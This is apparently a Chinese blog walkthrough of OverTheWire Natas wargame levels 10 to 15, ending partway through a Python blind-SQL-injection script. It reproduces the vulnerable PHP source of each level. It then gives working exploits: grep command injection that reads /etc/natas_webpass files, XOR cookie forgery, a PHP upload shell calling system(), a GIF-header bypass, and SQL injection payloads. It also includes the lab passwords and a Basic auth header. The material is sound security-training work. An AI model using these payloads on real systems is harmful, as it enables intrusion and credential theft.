<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>natas10<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;content&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">For security reasons, we now filter on certain characters<span class="tag">&lt;<span class="name">br</span>/&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span>&gt;</span></span><br><span class="line">Find words containing: <span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">needle</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">submit</span> <span class="attr">name</span>=<span class="string">submit</span> <span class="attr">value</span>=<span class="string">Search</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Output:</span><br><span class="line"><span class="tag">&lt;<span class="name">pre</span>&gt;</span></span><br><span class="line">&lt;?</span><br><span class="line">$key = &quot;&quot;;</span><br><span class="line"></span><br><span class="line">if(array_key_exists(&quot;needle&quot;, $_REQUEST)) &#123;</span><br><span class="line">    $key = $_REQUEST[&quot;needle&quot;];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if($key != &quot;&quot;) &#123;</span><br><span class="line">    if(preg_match(&#x27;/[;|&amp;]/&#x27;,$key)) &#123;</span><br><span class="line">        print &quot;Input contains an illegal character!&quot;;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        passthru(&quot;grep -i $key dictionary.txt&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"><span class="tag">&lt;/<span class="name">pre</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;viewsource&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;index-source.html&quot;</span>&gt;</span>View sourcecode<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>同样是命令执行，不过这一次进行了正则过滤，过滤了 <code>; | &amp;</code> ，经过测试，<code>%0A</code> 也无效果。</p>
<p>这里利用 grep 查看文件：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grep -i . filename</span><br></pre></td></tr></table></figure>

<p>构造命令：<code>grep -i . /etc/natas_webpass/natas11 # dictionary.txt</code>, （<code>#</code> 用于注释后续内容）查看密码</p>
<h2 id="Level-11"><a href="#Level-11" class="headerlink" title="Level 11"></a>Level 11</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200209090045175.png" alt="image-20200209090045175"></p>
<p>查看源码：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&lt;?</span><br><span class="line"></span><br><span class="line">$defaultdata = array( &quot;showpassword&quot;=&gt;&quot;no&quot;, &quot;bgcolor&quot;=&gt;&quot;#ffffff&quot;);</span><br><span class="line"></span><br><span class="line">function xor_encrypt($in) &#123;</span><br><span class="line">    $key = &#x27;<span class="tag">&lt;<span class="name">censored</span>&gt;</span>&#x27;;</span><br><span class="line">    $text = $in;</span><br><span class="line">    $outText = &#x27;&#x27;;</span><br><span class="line"></span><br><span class="line">    // Iterate through each character</span><br><span class="line">    for($i=0;$i&lt;strlen($text);$i++) &#123;</span><br><span class="line">    $outText .= $text[$i] ^ $key[$i % strlen($key)];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return $outText;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function loadData($def) &#123;</span><br><span class="line">    global $_COOKIE;</span><br><span class="line">    $mydata = $def;</span><br><span class="line">    if(array_key_exists(&quot;data&quot;, $_COOKIE)) &#123;</span><br><span class="line">    $tempdata = json_decode(xor_encrypt(base64_decode($_COOKIE[&quot;data&quot;])), true);</span><br><span class="line">    if(is_array($tempdata) &amp;&amp; array_key_exists(&quot;showpassword&quot;, $tempdata) &amp;&amp; array_key_exists(&quot;bgcolor&quot;, $tempdata)) &#123;</span><br><span class="line">        if (preg_match(&#x27;/^#(?:[a-f\d]&#123;6&#125;)$/i&#x27;, $tempdata[&#x27;bgcolor&#x27;])) &#123;</span><br><span class="line">        $mydata[&#x27;showpassword&#x27;] = $tempdata[&#x27;showpassword&#x27;];</span><br><span class="line">        $mydata[&#x27;bgcolor&#x27;] = $tempdata[&#x27;bgcolor&#x27;];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return $mydata;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function saveData($d) &#123;</span><br><span class="line">    setcookie(&quot;data&quot;, base64_encode(xor_encrypt(json_encode($d))));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$data = loadData($defaultdata);</span><br><span class="line"></span><br><span class="line">if(array_key_exists(&quot;bgcolor&quot;,$_REQUEST)) &#123;</span><br><span class="line">    if (preg_match(&#x27;/^#(?:[a-f\d]&#123;6&#125;)$/i&#x27;, $_REQUEST[&#x27;bgcolor&#x27;])) &#123;</span><br><span class="line">        $data[&#x27;bgcolor&#x27;] = $_REQUEST[&#x27;bgcolor&#x27;];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">saveData($data);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>natas11<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;content&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">style</span>=<span class="string">&quot;background: &lt;?=$data[&#x27;bgcolor&#x27;]?&gt;;&quot;</span>&gt;</span></span><br><span class="line">Cookies are protected with XOR encryption<span class="tag">&lt;<span class="name">br</span>/&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;?</span><br><span class="line">if($data[&quot;showpassword&quot;] == &quot;yes&quot;) &#123;</span><br><span class="line">    print &quot;The password for natas12 is <span class="tag">&lt;<span class="name">censored</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span>&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span>&gt;</span></span><br><span class="line">Background color: <span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">bgcolor</span> <span class="attr">value</span>=<span class="string">&quot;&lt;?=$data[&#x27;bgcolor&#x27;]?&gt;&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">submit</span> <span class="attr">value</span>=<span class="string">&quot;Set color&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;viewsource&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;index-source.html&quot;</span>&gt;</span>View sourcecode<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>进行代码审计，编写函数解密出 <code>$key</code> 的值</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$defaultdata</span> = <span class="title function_ invoke__">json_encode</span>(<span class="keyword">array</span>( <span class="string">&quot;showpassword&quot;</span>=&gt;<span class="string">&quot;no&quot;</span>, <span class="string">&quot;bgcolor&quot;</span>=&gt;<span class="string">&quot;#ffffff&quot;</span>));</span><br><span class="line"><span class="comment">// 从cookie中找到data的值</span></span><br><span class="line"><span class="variable">$data</span> = <span class="string">&quot;ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw=&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">calc</span>(<span class="params"><span class="variable">$defaultdata</span>, <span class="variable">$data</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$key</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="variable">$text</span> = <span class="variable">$defaultdata</span>;</span><br><span class="line">    <span class="variable">$outText</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$data</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$text</span>);<span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$key</span> .=  <span class="variable">$text</span>[<span class="variable">$i</span>] ^ <span class="variable">$outText</span>[<span class="variable">$i</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$key</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">calc</span>(<span class="variable">$defaultdata</span>, <span class="variable">$data</span>);</span><br><span class="line"><span class="comment">// 得到：qw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jq</span></span><br><span class="line"><span class="comment">// 所以 $key = qw8J</span></span><br></pre></td></tr></table></figure>

<p>然后构造数据重写cookie：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$data</span> = <span class="string">&quot;ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw=&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">xor_encrypt</span>(<span class="params"><span class="variable">$in</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$key</span> = <span class="string">&#x27;qw8J&#x27;</span>;</span><br><span class="line">    <span class="variable">$text</span> = <span class="variable">$in</span>;</span><br><span class="line">    <span class="variable">$outText</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="comment">// Iterate through each character</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$text</span>);<span class="variable">$i</span>++) &#123;</span><br><span class="line">    <span class="variable">$outText</span> .= <span class="variable">$text</span>[<span class="variable">$i</span>] ^ <span class="variable">$key</span>[<span class="variable">$i</span> % <span class="title function_ invoke__">strlen</span>(<span class="variable">$key</span>)];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$outText</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$arr</span> = <span class="title function_ invoke__">json_decode</span>(<span class="title function_ invoke__">xor_encrypt</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$data</span>)), <span class="literal">true</span>);</span><br><span class="line"><span class="variable">$arr</span>[<span class="string">&#x27;showpassword&#x27;</span>] = <span class="string">&quot;yes&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">xor_encrypt</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$arr</span>)));</span><br><span class="line"><span class="comment">// 得到 ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK</span></span><br></pre></td></tr></table></figure>

<p>修改数据包Cookie发送，得到密码：</p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200209100311627.png" alt="image-20200209100311627"></p>
<h2 id="Level-12"><a href="#Level-12" class="headerlink" title="Level 12"></a>Level 12</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200209100452614.png" alt="image-20200209100452614"></p>
<p>查看源码：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&lt;? </span><br><span class="line"></span><br><span class="line">function genRandomString() &#123;</span><br><span class="line">    $length = 10;</span><br><span class="line">    $characters = &quot;0123456789abcdefghijklmnopqrstuvwxyz&quot;;</span><br><span class="line">    $string = &quot;&quot;;    </span><br><span class="line"></span><br><span class="line">    for ($p = 0; $p &lt; $length; $p++) &#123;</span><br><span class="line">        $string .= $characters[mt_rand(0, strlen($characters)-1)];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return $string;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function makeRandomPath($dir, $ext) &#123;</span><br><span class="line">    do &#123;</span><br><span class="line">    $path = $dir.&quot;/&quot;.genRandomString().&quot;.&quot;.$ext;</span><br><span class="line">    &#125; while(file_exists($path));</span><br><span class="line">    return $path;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function makeRandomPathFromFilename($dir, $fn) &#123;</span><br><span class="line">    $ext = pathinfo($fn, PATHINFO_EXTENSION);</span><br><span class="line">    return makeRandomPath($dir, $ext);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(array_key_exists(&quot;filename&quot;, $_POST)) &#123;</span><br><span class="line">    $target_path = makeRandomPathFromFilename(&quot;upload&quot;, $_POST[&quot;filename&quot;]);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        if(filesize($_FILES[&#x27;uploadedfile&#x27;][&#x27;tmp_name&#x27;]) &gt; 1000) &#123;</span><br><span class="line">        echo &quot;File is too big&quot;;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        if(move_uploaded_file($_FILES[&#x27;uploadedfile&#x27;][&#x27;tmp_name&#x27;], $target_path)) &#123;</span><br><span class="line">            echo &quot;The file <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">\</span>&quot;$<span class="attr">target_path</span>\&quot;&gt;</span>$target_path<span class="tag">&lt;/<span class="name">a</span>&gt;</span> has been uploaded&quot;;</span><br><span class="line">        &#125; else&#123;</span><br><span class="line">            echo &quot;There was an error uploading the file, please try again!&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">?&gt; </span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span> <span class="attr">action</span>=<span class="string">&quot;index.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;MAX_FILE_SIZE&quot;</span> <span class="attr">value</span>=<span class="string">&quot;1000&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;filename&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&lt;? print genRandomString(); ?&gt;.jpg&quot;</span> /&gt;</span></span><br><span class="line">Choose a JPEG to upload (max 1KB):<span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;uploadedfile&quot;</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> /&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Upload File&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">&lt;? &#125; ?&gt; </span><br></pre></td></tr></table></figure>

<p>文件上传，利用<code> $ext = pathinfo($fn, PATHINFO_EXTENSION);</code>，抓包修改文件后缀为.php</p>
<p>php脚本为：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&quot;cat /etc/natas_webpass/natas13&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>访问返回的网址即可得到密码</p>
<h2 id="Level-13"><a href="#Level-13" class="headerlink" title="Level 13"></a>Level 13</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY </span><br></pre></td></tr></table></figure>

<p>查看源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">array_key_exists</span>(<span class="string">&quot;filename&quot;</span>, <span class="variable">$_POST</span>)) &#123;</span><br><span class="line">    <span class="variable">$target_path</span> = <span class="title function_ invoke__">makeRandomPathFromFilename</span>(<span class="string">&quot;upload&quot;</span>, <span class="variable">$_POST</span>[<span class="string">&quot;filename&quot;</span>]);</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$err</span>=<span class="variable">$_FILES</span>[<span class="string">&#x27;uploadedfile&#x27;</span>][<span class="string">&#x27;error&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$err</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$err</span> === <span class="number">2</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;The uploaded file exceeds MAX_FILE_SIZE&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Something went wrong :/&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="title function_ invoke__">filesize</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;uploadedfile&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>]) &gt; <span class="number">1000</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;File is too big&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (! <span class="title function_ invoke__">exif_imagetype</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;uploadedfile&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;File is not an image&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;uploadedfile&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$target_path</span>)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;The file &lt;a href=\&quot;<span class="subst">$target_path</span>\&quot;&gt;<span class="subst">$target_path</span>&lt;/a&gt; has been uploaded&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;There was an error uploading the file, please try again!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>新增一个exif判断文件是否为图片：<code>exif_imagetype($_FILES[&#39;uploadedfile&#39;][&#39;tmp_name&#39;])</code></p>
<p>在php文件头部添加 <code>GIF;</code> 即可绕过</p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200209102904374.png" alt="image-20200209102904374"></p>
<h2 id="Level-14"><a href="#Level-14" class="headerlink" title="Level 14"></a>Level 14</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200209103237780.png" alt="image-20200209103237780"></p>
<p>查看源码：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>natas14<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;content&quot;</span>&gt;</span></span><br><span class="line">&lt;?</span><br><span class="line">if(array_key_exists(&quot;username&quot;, $_REQUEST)) &#123;</span><br><span class="line">    $link = mysql_connect(&#x27;localhost&#x27;, &#x27;natas14&#x27;, &#x27;<span class="tag">&lt;<span class="name">censored</span>&gt;</span>&#x27;);</span><br><span class="line">    mysql_select_db(&#x27;natas14&#x27;, $link);</span><br><span class="line">    </span><br><span class="line">    $query = &quot;SELECT * from users where username=\&quot;&quot;.$_REQUEST[&quot;username&quot;].&quot;\&quot; and password=\&quot;&quot;.$_REQUEST[&quot;password&quot;].&quot;\&quot;&quot;;</span><br><span class="line">    if(array_key_exists(&quot;debug&quot;, $_GET)) &#123;</span><br><span class="line">        echo &quot;Executing query: $query<span class="tag">&lt;<span class="name">br</span>&gt;</span>&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if(mysql_num_rows(mysql_query($query, $link)) &gt; 0) &#123;</span><br><span class="line">            echo &quot;Successful login! The password for natas15 is <span class="tag">&lt;<span class="name">censored</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span>&quot;;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">            echo &quot;Access denied!<span class="tag">&lt;<span class="name">br</span>&gt;</span>&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    mysql_close($link);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;index.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line">Username: <span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">Password: <span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Login&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">&lt;? &#125; ?&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;viewsource&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;index-source.html&quot;</span>&gt;</span>View sourcecode<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span> </span><br></pre></td></tr></table></figure>

<p>万能密码绕过：<code>admin&quot; or &quot;1&quot;=&quot;1</code></p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200209103625234.png" alt="image-20200209103625234"></p>
<h2 id="Level-15"><a href="#Level-15" class="headerlink" title="Level 15"></a>Level 15</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200209103730879.png" alt="image-20200209103730879"></p>
<p>查看源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">CREATE TABLE `users` (</span></span><br><span class="line"><span class="comment">  `username` varchar(64) DEFAULT NULL,</span></span><br><span class="line"><span class="comment">  `password` varchar(64) DEFAULT NULL</span></span><br><span class="line"><span class="comment">);</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">array_key_exists</span>(<span class="string">&quot;username&quot;</span>, <span class="variable">$_REQUEST</span>)) &#123;</span><br><span class="line">    <span class="variable">$link</span> = <span class="title function_ invoke__">mysql_connect</span>(<span class="string">&#x27;localhost&#x27;</span>, <span class="string">&#x27;natas15&#x27;</span>, <span class="string">&#x27;&lt;censored&gt;&#x27;</span>);</span><br><span class="line">    <span class="title function_ invoke__">mysql_select_db</span>(<span class="string">&#x27;natas15&#x27;</span>, <span class="variable">$link</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$query</span> = <span class="string">&quot;SELECT * from users where username=\&quot;&quot;</span>.<span class="variable">$_REQUEST</span>[<span class="string">&quot;username&quot;</span>].<span class="string">&quot;\&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">array_key_exists</span>(<span class="string">&quot;debug&quot;</span>, <span class="variable">$_GET</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Executing query: <span class="subst">$query</span>&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$res</span> = <span class="title function_ invoke__">mysql_query</span>(<span class="variable">$query</span>, <span class="variable">$link</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$res</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">mysql_num_rows</span>(<span class="variable">$res</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;This user exists.&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;This user doesn&#x27;t exist.&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Error in query.&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">mysql_close</span>(<span class="variable">$link</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>根据源码，推测是盲注。</p>
<p>写脚本爆破(这是一个简陋的脚本)：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://natas15.natas.labs.overthewire.org/index.php?debug=1&quot;</span></span><br><span class="line">headers = &#123;<span class="string">&#x27;Authorization&#x27;</span>: <span class="string">&quot;Basic bmF0YXMxNTpBd1dqMHc1Y3Z4clppT05nWjlKNXN0TlZrbXhkazM5Sg==&quot;</span>, &#125;</span><br><span class="line">basic = <span class="string">&#x27;natas16&quot;and&quot;substr(password,1,1)&quot;&gt;&quot;&#x27;</span></span><br><span class="line">words = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">ord</span>(<span class="string">&#x27;0&#x27;</span>), <span class="built_in">ord</span>(<span class="string">&#x27;9&#x27;</span>) + <span class="number">1</span>):</span><br><span class="line">    words.append(<span class="built_in">chr</span>(i))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>), <span class="built_in">ord</span>(<span class="string">&#x27;Z&#x27;</span>) + <span class="number">1</span>):</span><br><span class="line">    words.append(<span class="built_in">chr</span>(i))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span 